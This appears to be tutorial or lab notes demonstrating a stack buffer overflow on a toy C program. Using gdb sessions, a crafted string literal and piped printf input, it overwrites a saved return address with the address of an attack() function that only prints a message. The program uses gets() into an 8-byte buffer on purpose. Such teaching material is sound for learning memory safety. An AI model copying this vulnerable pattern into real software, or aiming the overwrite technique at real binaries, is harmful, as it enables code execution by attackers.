Overwrite Return Address Using Buffer Overflow Attack
----------------------------------------------------------------

  5 void attack()
  6 {
  7     printf("attacker's code is executed!!\n");
  8     exit(0);
  9 }
 10 
 11 
 12 void get_input()
 13 {
 14     char buffer[8];
 15 
 16 //    strcpy(buffer, "AAAAAAAAAAAA\x90\x84\x04\x08");   
 17     gets(buffer);
 18     puts(buffer);
 19 }
 20 
 21 
 22 int main(int argc, char** argv)
 23 {
 24     get_input();
 25 
 26     return 0;
 27 }

$ ./overwrite_return_addr 
AAAAAAA
AAAAAAA


1. Use gdb to overwrite the return address
----------------------------------------------------------------
$ gdb ./overwrite_return_addr 
(gdb) break 24
(gdb) break 17

(gdb) r
Breakpoint 1, main (argc=1, argv=0xbfffefa4) at overwrite_return_addr.c:24

(gdb) disass
Dump of assembler code for function main:
   0x080484cc <+0>: push   ebp
   0x080484cd <+1>: mov    ebp,esp
=> 0x080484cf <+3>: call   0x80484ae <get_input>
   0x080484d4 <+8>: mov    eax,0x0
   0x080484d9 <+13>:    pop    ebp
   0x080484da <+14>:    ret  

(gdb) x/8xw $esp
0xbfffef08: 0x00000000  0x46cbe963  0x00000001  0xbfffefa4
0xbfffef18: 0xbfffefac  0xb7ffe6b0  0x00000001  0x00000001

(gdb) c
Breakpoint 2, get_input () at overwrite_return_addr.c:17

(gdb) disass
Dump of assembler code for function get_input:
   0x080484ae <+0>:     push   ebp
   0x080484af <+1>:     mov    ebp,esp
   0x080484b1 <+3>:     sub    esp,0xc
=> 0x080484b4 <+6>:     lea    eax,[ebp-0x8]
   0x080484b7 <+9>:     mov    DWORD PTR [esp],eax
   0x080484ba <+12>:    call   0x8048330 <gets@plt>
   0x080484bf <+17>:    lea    eax,[ebp-0x8]
   0x080484c2 <+20>:    mov    DWORD PTR [esp],eax
   0x080484c5 <+23>:    call   0x8048340 <puts@plt>
   0x080484ca <+28>:    leave  
   0x080484cb <+29>:    ret    

(gdb) x/16xw $esp
0xbfffeef4: 0x0000002f  0x080484eb  0x46e5e000  0xbfffef08
0xbfffef04: 0x080484d4  0x00000000  0x46cbe963  0x00000001
0xbfffef14: 0xbfffefa4  0xbfffefac  0xb7ffe6b0  0x00000001
0xbfffef24: 0x00000001  0x00000000  0x0804a01c  0x0804823c

(gdb) x/w 0xbfffef04
0xbfffef04: 0x080484d4

(gdb) s
AAAAAAAAAAAA

(gdb) x/16xw $esp
0xbfffeef4: 0xbfffeef8  0x41414141  0x41414141  0x41414141
0xbfffef04: 0x08048400  0x00000000  0x46cbe963  0x00000001
0xbfffef14: 0xbfffefa4  0xbfffefac  0xb7ffe6b0  0x00000001
0xbfffef24: 0x00000001  0x00000000  0x0804a01c  0x0804823c

(gdb) x/w 0xbfffef04
0xbfffef04: 0x08048400

(gdb) disass attack
Dump of assembler code for function attack:
   0x08048490 <+0>: push   ebp
   0x08048491 <+1>: mov    ebp,esp
   0x08048493 <+3>: sub    esp,0x4
   0x08048496 <+6>: mov    DWORD PTR [esp],0x8048574
   0x0804849d <+13>:    call   0x8048340 <puts@plt>
   0x080484a2 <+18>:    mov    DWORD PTR [esp],0x0
   0x080484a9 <+25>:    call   0x8048360 <exit@plt>

(gdb) set *(0xbfffef04) = 0x08048490

(gdb) x/16xw $esp
0xbfffeef4: 0xbfffeef8  0x41414141  0x41414141  0x41414141
0xbfffef04: 0x08048490  0x00000000  0x46cbe963  0x00000001
0xbfffef14: 0xbfffefa4  0xbfffefac  0xb7ffe6b0  0x00000001
0xbfffef24: 0x00000001  0x00000000  0x0804a01c  0x0804823c

(gdb) c
AAAAAAAAAAAA��
attacker's code is executed!!


2. Use a string literal to overwrite the return address
----------------------------------------------------------------

 12 void get_input()
 13 {
 14     char buffer[8];
 15 
 16     strcpy(buffer, "AAAAAAAAAAAA\x60\x84\x04\x08");
 17 //    gets(buffer);
 18     puts(buffer);
 19 }   

$ gdb ./overwrite_return_addr

(gdb) disass attack
Dump of assembler code for function attack:
   0x08048460 <+0>:     push   ebp
   0x08048461 <+1>:     mov    ebp,esp
   0x08048463 <+3>:     sub    esp,0x4
   0x08048466 <+6>:     mov    DWORD PTR [esp],0x8048564
   0x0804846d <+13>:    call   0x8048310 <puts@plt>
   0x08048472 <+18>:    mov    DWORD PTR [esp],0x0
   0x08048479 <+25>:    call   0x8048330 <exit@plt>

Note: If there is another start address of this function - change
the string literal and recompile the source file.

(gdb) break 16

(gdb) disass main 
Dump of assembler code for function main:
   0x080484b3 <+0>:     push   ebp
   0x080484b4 <+1>:     mov    ebp,esp
   0x080484b6 <+3>:     call   0x804847e <get_input>
   0x080484bb <+8>:     mov    eax,0x0
   0x080484c0 <+13>:    pop    ebp
   0x080484c1 <+14>:    ret   

(gdb) r
Breakpoint 1, get_input () at overwrite_return_addr.c:16

(gdb) disass
Dump of assembler code for function get_input:
   0x0804847e <+0>:     push   ebp
   0x0804847f <+1>:     mov    ebp,esp
   0x08048481 <+3>:     sub    esp,0xc
=> 0x08048484 <+6>:     lea    eax,[ebp-0x8]
   0x08048487 <+9>:     mov    DWORD PTR [eax],0x41414141
   0x0804848d <+15>:    mov    DWORD PTR [eax+0x4],0x41414141
   0x08048494 <+22>:    mov    DWORD PTR [eax+0x8],0x41414141
   0x0804849b <+29>:    mov    DWORD PTR [eax+0xc],0x8048460
   0x080484a2 <+36>:    mov    BYTE PTR [eax+0x10],0x0
   0x080484a6 <+40>:    lea    eax,[ebp-0x8]
   0x080484a9 <+43>:    mov    DWORD PTR [esp],eax
   0x080484ac <+46>:    call   0x8048310 <puts@plt>
   0x080484b1 <+51>:    leave  
   0x080484b2 <+52>:    ret    

(gdb) x/16xw $esp
0xbfffeef4: 0x0000002f  0x080484db  0x46e5e000  0xbfffef08
0xbfffef04: 0x080484bb  0x00000000  0x46cbe963  0x00000001
0xbfffef14: 0xbfffefa4  0xbfffefac  0xb7ffe6b0  0x00000001
0xbfffef24: 0x00000001  0x00000000  0x0804a018  0x0804822c

(gdb) s

(gdb) x/16xw $esp
0xbfffeef4: 0x0000002f  0x41414141  0x41414141  0x41414141
0xbfffef04: 0x08048460  0x00000000  0x46cbe963  0x00000001
0xbfffef14: 0xbfffefa4  0xbfffefac  0xb7ffe6b0  0x00000001
0xbfffef24: 0x00000001  0x00000000  0x0804a018  0x0804822c

(gdb) c
AAAAAAAAAAAA`�
attacker



3. Use an input string to overwrite the return address
----------------------------------------------------------------

 12 void get_input()
 13 {
 14     char buffer[8];
 15 
 16 //    strcpy(buffer, "AAAAAAAAAAAA\x60\x84\x04\x08");  
 17     gets(buffer);
 18     puts(buffer);
 19 }   

$ make

Note: Use gdb to check the address of attack()

$ printf "AAAAAAAAAAAA\x90\x84\x04\x08" | ./overwrite_return_addr
AAAAAAAAAAAA��
attacker's code is executed!!



